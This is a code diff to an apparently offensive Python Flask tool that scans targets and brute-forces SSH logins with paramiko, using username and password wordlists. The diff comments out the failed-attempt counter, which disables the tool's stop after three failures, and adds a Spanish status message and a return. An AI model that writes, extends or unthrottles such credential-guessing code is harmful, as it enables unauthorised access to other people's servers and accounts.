@@ -31,6 +31,7 @@ def handle_scan():
         'scan_vulnerabilities_found': scan_result['vulnerabilities_found'],
         'brute_force_successful': any(result['status'] == 'success' for result in brute_force_result)
     }
+    print("Operación de escaneo y fuerza bruta finalizada.")
     return jsonify(response)
 
 API_KEY = os.getenv("API_KEY")
@@ -167,7 +168,7 @@ def start_brute_force(target):
         except paramiko.ssh_exception.AuthenticationException:
             result = {'username': username, 'password': password, 'status': 'failure'}
             print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
-            failed_attempts += 1
+            # failed_attempts += 1
         except paramiko.ssh_exception.SSHException as e:
             result = {'username': username, 'password': password, 'status': 'ssh_exception', 'error': str(e)}
             print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
@@ -183,6 +184,7 @@ def start_brute_force(target):
         if failed_attempts >= 3:
             stop_flag = True
             print("Hemos intentado realizar fuerza bruta pero no pudimos.")
+            return
 
     usernames_file = "usernamesReal.txt"
     passwords_file = "passwordsReal.txt"
